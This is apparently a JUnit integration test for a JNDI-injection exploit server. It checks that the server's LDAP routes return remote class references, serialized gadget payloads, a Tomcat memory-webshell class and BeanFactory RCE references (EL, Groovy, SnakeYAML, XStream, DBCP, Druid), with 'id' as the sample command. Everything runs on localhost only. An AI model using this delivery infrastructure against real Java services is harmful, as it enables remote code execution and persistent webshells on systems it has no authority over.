package com.bloom.server;

import com.bloom.util.config;
import com.unboundid.ldap.sdk.LDAPConnection;
import com.unboundid.ldap.sdk.SearchResultEntry;
import com.unboundid.ldap.sdk.SearchScope;
import org.junit.Assert;
import org.junit.BeforeClass;
import org.junit.Test;

import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.net.HttpURLConnection;
import java.net.ServerSocket;
import java.net.URL;

/**
 * LDAP/HTTP 投递链路集成测试：只读 LDAP 返回属性与 HTTP 状态，不触发客户端 JNDI 解析。
 */
public class LdapServerIntegrationTest {

    private static int ldapPort;
    private static int httpPort;

    @BeforeClass
    public static void startServers() throws Exception {
        ldapPort = freePort();
        httpPort = freePort();
        config.ip = "127.0.0.1";
        config.ldapPort = ldapPort;
        config.httpPort = httpPort;
        HttpServerStart.start();
        LdapServer.lanuchLDAPServer();
        Thread.sleep(300);
    }

    @Test
    public void basicRouteReturnsRemoteReference() throws Exception {
        try (LDAPConnection conn = new LDAPConnection("127.0.0.1", ldapPort)) {
            SearchResultEntry entry = conn.searchForEntry("basic/base64/aWQ=", SearchScope.BASE, "(objectClass=*)");
            Assert.assertNotNull(entry);
            Assert.assertEquals("foo", entry.getAttributeValue("javaClassName"));
            String factory = entry.getAttributeValue("javaFactory");
            Assert.assertNotNull("basic 路由应返回 javaFactory", factory);
            Assert.assertNotNull(entry.getAttributeValue("javaCodeBase"));
            Assert.assertNull("basic 路由不应携带序列化数据", entry.getAttributeValue("javaSerializedData"));

            URL url = new URL("http://127.0.0.1:" + httpPort + "/" + factory.replace('.', '/') + ".class");
            HttpURLConnection http = (HttpURLConnection) url.openConnection();
            Assert.assertEquals("HTTP 侧应能取到工厂类字节码", 200, http.getResponseCode());
            Assert.assertTrue(http.getContentLength() > 0);
            http.disconnect();
        }
    }

    @Test
    public void gadgetRouteReturnsSerializedData() throws Exception {
        try (LDAPConnection conn = new LDAPConnection("127.0.0.1", ldapPort)) {
            SearchResultEntry entry = conn.searchForEntry("URLDNS/test.example.com", SearchScope.BASE, "(objectClass=*)");
            Assert.assertNotNull(entry);
            Assert.assertNotNull("gadget 路由应返回 javaSerializedData", entry.getAttributeValue("javaSerializedData"));
            Assert.assertNull(entry.getAttributeValue("javaFactory"));
        }
    }

    // #9 回归：basic/memshell 已知名投递，javaFactory 与 HTTP 缓存 key 均为简单类名。
    @Test
    public void memshellRouteServesShell() throws Exception {
        try (LDAPConnection conn = new LDAPConnection("127.0.0.1", ldapPort)) {
            SearchResultEntry entry = conn.searchForEntry("basic/memshell/TomcatFilterMemShellFromThread", SearchScope.BASE, "(objectClass=*)");
            Assert.assertNotNull(entry);
            Assert.assertEquals("TomcatFilterMemShellFromThread", entry.getAttributeValue("javaFactory"));

            URL url = new URL("http://127.0.0.1:" + httpPort + "/TomcatFilterMemShellFromThread.class");
            HttpURLConnection http = (HttpURLConnection) url.openConnection();
            Assert.assertEquals("HTTP 侧应能取到内存马字节码", 200, http.getResponseCode());
            Assert.assertTrue(http.getContentLength() > 0);
            http.disconnect();
        }
    }

    // #9：未知 memshell 名必须被服务端明确拒绝并输出报错，不得静默 200/404 假象。
    @Test
    public void unknownMemshellRejectedWithError() throws Exception {
        ByteArrayOutputStream serverLog = new ByteArrayOutputStream();
        PrintStream originalOut = System.out;
        System.setOut(new PrintStream(serverLog, true, "UTF-8"));
        try (LDAPConnection conn = new LDAPConnection("127.0.0.1", ldapPort)) {
            SearchResultEntry entry = conn.searchForEntry("basic/memshell/NoSuchShell", SearchScope.BASE, "(objectClass=*)");
            Assert.assertNotNull(entry);
            Assert.assertNull("非法 memshell 不得返回 javaFactory", entry.getAttributeValue("javaFactory"));
        } finally {
            System.setOut(originalOut);
        }
        Assert.assertTrue("服务端应输出明确报错: " + serverLog,
                serverLog.toString("UTF-8").contains("无该内存马类型"));
    }

    // #8: BeanFactory 系 12 类路由直返 Reference 属性，不依赖 javaSerializedData 信任。
    @Test
    public void beanFactoryRoutesReturnDirectReference() throws Exception {
        String[] routes = {
                "EL/id", "groovyBytomcat/id", "snakeyaml/http://127.0.0.1/exp.jar",
                "XStream/id", "mvel/id", "BeanShell2/id",
                "tomcat_dbcp1_RCE/http://127.0.0.1/a.xml", "tomcat_dbcp2_RCE/http://127.0.0.1/a.xml",
                "commons_dbcp1_RCE/http://127.0.0.1/a.xml", "commons_dbcp2_RCE/http://127.0.0.1/a.xml",
                "druidjdbc/http://127.0.0.1/a.xml", "tomcatjdbc/http://127.0.0.1/a.xml",
        };
        try (LDAPConnection conn = new LDAPConnection("127.0.0.1", ldapPort)) {
            for (String route : routes) {
                SearchResultEntry entry = conn.searchForEntry(route, SearchScope.BASE, "(objectClass=*)");
                Assert.assertNotNull(route, entry);
                Assert.assertNotNull(route + " 应含 javaClassName", entry.getAttributeValue("javaClassName"));
                Assert.assertNotNull(route + " 应含 javaFactory", entry.getAttributeValue("javaFactory"));
                String[] addrs = entry.getAttributeValues("javaReferenceAddress");
                Assert.assertNotNull(route + " 应含 javaReferenceAddress", addrs);
                Assert.assertTrue(route + " refAddr 应按序编码: " + addrs[0], addrs[0].startsWith("#0#"));
                Assert.assertNull(route + " 不应含 javaSerializedData", entry.getAttributeValue("javaSerializedData"));
            }
        }
    }

    // #8: --force-serialize 回退为序列化输出（旧行为对照）。
    @Test
    public void forceSerializeFallsBackToSerializedData() throws Exception {
        config.forceSerialize = true;
        try (LDAPConnection conn = new LDAPConnection("127.0.0.1", ldapPort)) {
            SearchResultEntry entry = conn.searchForEntry("EL/id", SearchScope.BASE, "(objectClass=*)");
            Assert.assertNotNull(entry);
            Assert.assertNotNull("force-serialize 应输出 javaSerializedData", entry.getAttributeValue("javaSerializedData"));
            Assert.assertNull("force-serialize 不应直返 Reference", entry.getAttributeValue("javaReferenceAddress"));
        } finally {
            config.forceSerialize = false;
        }
    }

    private static int freePort() throws Exception {
        try (ServerSocket socket = new ServerSocket(0)) {
            return socket.getLocalPort();
        }
    }
}
